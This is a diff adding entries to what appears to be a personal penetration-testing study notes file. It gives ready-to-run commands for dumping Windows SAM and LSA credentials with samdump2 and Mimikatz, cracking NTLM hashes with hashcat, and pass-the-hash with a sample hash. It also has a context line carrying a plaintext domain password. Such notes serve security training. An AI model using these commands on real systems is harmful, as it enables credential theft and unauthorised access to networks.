@@ -1733,6 +1733,29 @@ impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTung
 2. for each vulnerabilities suggested, run metasploit payload to obtain Reverse shell: `use exploit/windows/local/ms10_015_kitrap0d`
 3. repeat thru the listed of suggested exploits and try until success
 
+# 78
+use hfs.exe to host file in windows for transfer to Linux
+use samdump2 to decrypt SAM... `samdump2 system sam` -> copy and paste the hashes to notepad -> `hashcat -m 1000 -a 3 hashes.txt rockyou.txt`
+- SAM stores NTLM
+
+
+# 79 
+dump SAM and LSA usingmimikatz
+needs to be admin to run mimikatz
+powershell -ep bypass
+import-module .\invoke-mimikatz.ps1
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
+
+# 80. pass the hash using mimikatz
+powershell -ep bypass
+import-module .\invoke-mimikatz.ps1
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:stdent5 /domain:pentesting /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell.exe"'
+
+passthehash= hash is valid only until the user change the password -> use RC4
+pass the ticket only valid for a few hours
+Kerberos -> AES256
+
+
 # MISC
 
 ## General tips
